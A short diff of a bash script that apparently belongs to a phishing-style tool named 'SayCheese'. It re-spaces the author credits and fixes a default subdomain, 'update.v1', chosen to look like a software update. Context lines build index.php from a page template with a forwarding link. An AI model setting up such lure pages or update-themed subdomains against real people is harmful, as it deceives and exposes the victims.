@@ -15,8 +15,8 @@ printf "\e[1;92m  ___) | (_| | |_| \e[0m\e[1;77m| |___| | | |  __/  __/\__ \  __
 printf "\e[1;92m |____/ \__,_|\__, |\e[0m\e[1;77m\____|_| |_|\___|\___||___/\___| \e[0m\n"
 printf "\e[1;92m              |___/ \e[0m                                 \n"
 
-printf " \e[1;77m v1.0 coded by github.com/mweshfi/pap\e[0m \n"
-printf " \e Follow Me on Instagram : @mweshfi \n"
+printf " \e[1;77m           v1.0 coded by github.com/mweshfi/pap\e[0m \n"
+printf " \e                    Follow Me on Instagram : @mweshfi \n"
 printf "\n"
 
 
@@ -219,7 +219,7 @@ sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 start() {
 
 default_choose_sub="Y"
-default_subdomain="update.v$RANDOM"
+default_subdomain="update.v1"
 
 printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
 read choose_sub
